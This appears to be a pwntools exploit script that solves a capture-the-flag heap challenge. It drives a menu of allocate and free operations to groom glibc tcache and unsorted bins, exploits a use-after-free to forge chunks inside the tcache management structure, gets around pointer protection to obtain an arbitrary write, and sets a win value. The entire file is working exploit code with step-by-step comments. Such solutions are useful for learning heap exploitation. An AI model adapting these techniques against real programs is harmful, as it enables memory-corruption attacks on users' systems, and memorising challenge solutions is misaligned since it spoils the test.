#!/usr/bin/env python3
from pwn import *

elf = ELF('./chal')

alloc_count = -1

def menu():
    return p.recvuntil(b'> ')

def malloc(size, data, offset=0):
    global alloc_count
    print("[%s]malloc(%s)" % (alloc_count, hex(size)))
    p.sendline(b'1')
    p.sendlineafter(b'Allocation size: ', str(size).encode())
    p.sendlineafter(b'Write offset: ', str(offset).encode())
    p.sendafter(b'Data for buffer: ', data)
    alloc_count += 1
    menu()
    return alloc_count

def free(idx):
    print("free(%s)" % idx)
    p.sendline(b'2')
    p.sendlineafter(b'Free idx: ', str(idx).encode())
    menu()

p = process(elf.path)
menu()



#####################################
#           Prep allocations        #
#####################################

mal_size = 0x88

x = []
y = []
for i in range(7):
    x.append(malloc(mal_size, b'TCACHE_FUEL'))
for i in range(7):
    y.append(malloc(0x1a8, b'TCACHE_FUEL'))

free(malloc(0x3d8, b'ASD')) # Set 0x1 in heap above 0x20 and 0x30 t-cache list
free(malloc(0x3e8, b'ASD')) # ^^^^^^^^

malloc(0x18, b'PADDING 1')
a1 = malloc(mal_size, b'A1'*(mal_size//2))
b1 = malloc(mal_size, b'B1'*(mal_size//2))
c1 = malloc(mal_size, b'C1'*(mal_size//2))
d1 = malloc(mal_size, b'D1'*(mal_size//2))
malloc(0x18, b'PADDING 2')
a2 = malloc(mal_size, b'A2'*(mal_size//2))
b2 = malloc(mal_size, b'B2'*(mal_size//2))
c2 = malloc(mal_size, b'C2'*(mal_size//2))
d2 = malloc(mal_size, b'D2'*(mal_size//2))
malloc(0x18, b'PADDING 3')

for i in x:
    free(i)
#########################################################
#           Create the UAF setup for later              #
#########################################################
free(a1)
free(b1)
free(c1)

free(a2)
free(b2)
free(c2)


unsorted2 = malloc(0x1a8, b'2'*0x118+p64(0x31))
unsorted1 = malloc(0x1a8, b'1'*0x118+p64(0x21))

free(c1) # 0x21 t-cache entry
free(c2) # 0x31 t-cache entry
free(unsorted2)
free(unsorted1)

unsorted1 = malloc(0x1a8, b'1'*mal_size+p64(0xe1))
unsorted2 = malloc(0x1a8, b'2'*mal_size+p64(0xf1))
for i in y:
    free(i)

free(b1) # 0xe1 chunk entry
free(b2) # 0xf1 chunk entry
#########################################################
#       Fit the unsorted chunks to fit in the UAF       #
#########################################################

# Fit unsorted 1
free(unsorted1)
free(d1)

malloc(0x38, b'X')
malloc(0x48, b'X')
malloc(0x38, b'X')
malloc(0x58, b'X')

unsorted_f1 = malloc(0x108, b'Y'*mal_size)

# Fit unsorted 2
free(unsorted2)
free(d2)

malloc(0x38, b'X')
malloc(0x48, b'X')
malloc(0x38, b'X')
malloc(0x58, b'X')

unsorted_f2 = malloc(0x108, b'Z'*mal_size)

unsorted_f3 = malloc(0x108, b'X'*mal_size) # This will be hijacked

#################################################################
#               Create the two unsorted entries                 #
#################################################################
z = []
for i in range(8):
    z.append(malloc(0x108, b'^'*0x108))
for i in z:
    free(i)

#################################################################################
#   Make the entry in the mgmt chunk a valid chunk by making the size 0x10000   #
#   and making a valid size next to it with prev_in_use set to 0                #
#################################################################################

for i in range(36):
    malloc(0x5f8, b'Z'*0x5f8)
malloc(0x5f8, b'A'*0xd0+p64(0x10000)+p64(0x20))

###############
# Free chunks #
###############

free(unsorted_f1) # Start of unsorted bin

free(unsorted_f3) # This will be hijacked for later

free(unsorted_f2) # End of unsorted bin


#############################################################################################
# Change the FWD and BCK pointers of the unsorted bin entires to our faked chunk in mgmt    #
#############################################################################################

malloc(0xd8, p16(0x6080), 0xa8) # BCK
malloc(0xe8, p16(0x6080), 0xa0) # FWD 

# Remove the t-cache entries for 0x108
#for i in range(7):
#    malloc(0x108, b'>'*0x108)


#########################################################################################
# Alloc in to mgmt chunk to overwrite LSB of 0x3d8 t-cache entry to control mgmt fully! #
#########################################################################################

# Overwrite lsb of 0x3d8
malloc(0x248, p16(0x6010), 0x1e0)

# Allocate at the management chunk!
mgmt = malloc(0x3d8, p8(0)*0x288)

###########################
#   Bypass protect_ptr    #
###########################

l1 = malloc(0x18, b'A'*0x18)
l2 = malloc(0x18, b'B'*0x18)

l3 = malloc(0x188, b'A'*0x188)
l4 = malloc(0x188, b'B'*0x188)

free(l1)
free(l2)
free(l3)
free(l4)

free(mgmt)
# Fake a chunk and make the LSB of 0x20 t-cache point to the WIN condition pointer
malloc(0x288, p64(0x191)+p16(0x62a0), 0x78)

# Index the now encrypted pointer in to the heap management chunk
malloc(0x18, b'???')


free(mgmt)
# Fake a chunk and make the LSB of 0x20 t-cache point to the WIN condition pointer
malloc(0x288, p16(0x6090), 0x138)

########## Malloc twice to allocate the arbitrary pointer!
malloc(0x188, b'Next alloc is winz!')

# Set win-condition
malloc(0x188, p64(0x37C3C7F))

###############
# $$$ WIN $$$ #
###############
p.sendline(b'3')

#gdb.attach(p)


p.interactive()
